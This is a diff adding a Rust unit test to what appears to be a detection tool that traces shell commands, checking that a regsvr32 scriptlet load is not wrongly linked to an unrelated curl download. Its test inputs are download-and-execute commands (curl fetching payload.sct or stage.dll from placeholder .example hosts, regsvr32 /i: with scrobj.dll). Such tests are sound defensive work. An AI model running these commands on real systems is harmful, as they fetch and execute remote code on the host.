@@ -12387,6 +12387,31 @@ regsvr32 /s /n /u /i:payload.sct scrobj.dll"#,
     }
 
     #[test]
+    fn regsvr32_current_dir_nested_scriptlet_does_not_use_unrelated_basename_download() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"curl -o D:\Other\payload.sct https://regsvr32-current-dir-wrong-basename.example/payload.sct"#,
+            &mut env,
+        );
+        interpret_line(
+            r"regsvr32 /s /n /u /i:.\Temp\payload.sct scrobj.dll",
+            &mut env,
+        );
+        assert!(
+            !env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlArgument { cmd, url }
+                        if cmd == r"regsvr32 /s /n /u /i:.\Temp\payload.sct scrobj.dll"
+                            && url == "https://regsvr32-current-dir-wrong-basename.example/payload.sct"
+                )
+            }),
+            "regsvr32 current-dir nested scriptlet reused unrelated basename download: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn regsvr32_local_load_target_resolves_prior_download_source() {
         let report = crate::analyze(
             br#"curl -o stage.dll https://regsvr32-load.example/stage.dll
